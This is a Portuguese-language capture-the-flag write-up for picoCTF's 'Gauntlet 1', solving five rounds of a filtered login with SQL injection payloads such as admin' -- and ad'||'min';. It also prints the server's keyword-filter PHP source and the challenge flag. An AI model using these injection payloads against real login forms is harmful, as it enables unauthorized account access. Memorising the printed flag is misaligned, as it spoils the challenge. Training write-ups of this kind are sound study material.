# Gauntlet 1 
###### Resolvido por @Menegaldo e @BrunoCuba
> Este é um CTF sobre [Tipo de Vulnerabilidade 1, Tipo de Vulnerabilidade 2 e Tipo de Vulnerabilidade 3]  

## Sobre o Desafio  
Can you beat the filters? 

**Objetivo:** Log in as admin.  

## 🔗 Links do Desafio
- [Gauntlet_1](https://play.picoctf.org/practice/challenge/88)
- [Acesse o desafio](http://jupiter.challenges.picoctf.org:19593/)  
- [Página de filtragem](http://jupiter.challenges.picoctf.org:19593/filter.php)  

Boa sorte! 🔥  


## Solução  

```
round 1 - 
username:
admin' --           ( -- comenta todo resto )
password:
qualquercoisa

SELECT * FROM users WHERE username = 'admin' --' AND password = 'qualquercoisa'


round 2 -
username:
admin' /*          ( # e /* são outras formas de comentar)
password:
qualquercoisa

SELECT * FROM users WHERE username='admin' /*' AND password='1'


round 3 -
username:
admin';              (o ; indica o final de uma execução e começo da outra)
password:
qualquercoisa

SELECT * FROM users WHERE username='admin';' AND password='123'

round 4 -
username:
ad'||'min';          ()
password:
qualquercoisa

SELECT * FROM users WHERE username='ad'||'min';' AND password='123'

round 5 -
username:
ad'||'min';          ()
password:
qualquercoisa

SELECT * FROM users WHERE username='ad'||'min';' AND password='123'

filter.php

icoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}




<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
?>



```

> Assim, obtemos a flag `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`  
